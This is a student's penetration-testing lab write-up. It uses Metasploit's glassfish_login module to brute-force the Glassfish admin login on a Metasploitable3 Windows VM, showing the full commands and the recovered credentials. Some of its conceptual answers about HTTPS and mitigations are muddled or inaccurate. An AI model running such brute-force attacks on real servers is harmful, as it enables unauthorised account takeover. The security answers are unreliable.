# Exercises
Penetration testing exercise using metasploit on Glassfish. The exercise
targets the Glassfish application server running under Windows in the metasploitable3 image. The test is performed via a brute force attack against the
login page.

In this exercise we need the Kali machine (for penetration testing) and the vulnerable
machine is the Metasploitable3 Windows image. It is the only exercise to be performed
against the Windows image and the last metasploitable exercise of the course.

Please note that all questions (full lines) marked with †should be answered in the report
which you submit as assignment 2. Note on the length of answers: Questions which are
described as discussion or open target an appropriate level of elaboration as you see fit,
whereas the other questions can typically be answered with a sentence. Nonetheless,
there are no length requirements on the answers.

While scanning for vulnernable services in Exercise~03, Glassfish running on port 4848
should have come up.

# Background
**†What does https actually provide protection for?**  
HTTPS which is an ecrypted version of the protocol provides protection against data/packet sniffing also called MITM attacks.  


# Brute Force Attack
Creating user.txt and pass.txt
````console
berkankutuk@kali:~$ nano user.txt
berkankutuk@kali:~$ nano pass.txt
````

Goint into msfconsole
````console
berkankutuk@kali:~$ msfconsole
msf6 > use auxiliary/scanner/http/glassfish_login
msf6 auxiliary(scanner/http/glassfish_login) > show options
  Name              Current Setting  Required  Description                                                                                                                                                                                  
  ----              ---------------  --------  -----------                                                                                                                                                                                  
  BLANK_PASSWORDS   false            no        Try blank passwords for all users                                                                                                                                                            
  BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5                                                                                                                                                          
  DB_ALL_CREDS      false            no        Try each user/password couple stored in the current database                                                                                                                                 
  DB_ALL_PASS       false            no        Add all passwords in the current database to the list                                                                                                                                        
  DB_ALL_USERS      false            no        Add all users in the current database to the list                                                                                                                                            
  DB_SKIP_EXISTING  none             no        Skip existing credentials stored in the current database (Accepted: none, user, user&realm)                                                                                                  
  PASSWORD                           no        A specific password to authenticate with                                                                                                                                                     
  PASS_FILE                          no        File containing passwords, one per line
  Proxies                            no        A proxy chain of format type:host:port[,type:host:port][...]
  RHOSTS                             yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
  RPORT             4848             yes       The target port (TCP)
  SSL               false            no        Negotiate SSL/TLS for outgoing connections
  STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works for a host
  THREADS           1                yes       The number of concurrent threads (max one per host)
  USERNAME          admin            yes       A specific username to authenticate as
  USERPASS_FILE                      no        File containing users and passwords separated by space, one pair per line
  USER_AS_PASS      false            no        Try the username as the password for all users
  USER_FILE                          no        File containing usernames, one per line
  VERBOSE           true             yes       Whether to print output for all attempts
  VHOST                              no        HTTP server virtual host
````

Setting the parameters
````console
msf6 auxiliary(scanner/http/glassfish_login) > set RHOST 10.0.2.5
msf6 auxiliary(scanner/http/glassfish_login) > set USER_FILE user.txt
msf6 auxiliary(scanner/http/glassfish_login) > set PASS_FILE pass.txt
````
RPORT is already set, so we move on.

Running the exploit
Setting the parameters
```console
msf6 auxiliary(scanner/http/glassfish_login) > exploit
[*] 10.0.2.5:4848 - Checking if Glassfish requires a password...
[*] 10.0.2.5:4848 - Glassfish is protected with a password
[-] 10.0.2.5:4848 - Failed: 'admin:1234567'

[!] No active DB -- Credential data will not be saved!
[-] 10.0.2.5:4848 - Failed: 'admin:password'
[-] 10.0.2.5:4848 - Failed: 'admin:Password'
[-] 10.0.2.5:4848 - Failed: 'admin:Password123'
...
[+] 10.0.2.5:4848 - Success: 'admin:sploit'
...
```

We got the credentials: `admin:sploit`

# Questions
**†Which username/password combination did you find?**  
Username: admin  
Password: sploit

**†Discuss which security relevant problems are we testing with a brute force attack?**  
Weak password that are common and unencrypted passwords

**†Discuss what would be your suggestions to the admin in order to address and mitigate
this issue?**   
Either random-generate or encrypt passwords.

**†How is this attack type related to the internet of things, internet routers, and, e.g.,
virtual machines?**  
Trial and error method in order to guess user credentials for an authorized system.

**†Do you know a way in which https could make the connection more secure against this
kind of attack?**  
By managing the incorrect login attempts and asking for CAPTCHA. Furthermore, by encrypting the packet values, so no others can eavesdrop and thereby see the credentials in plain text.
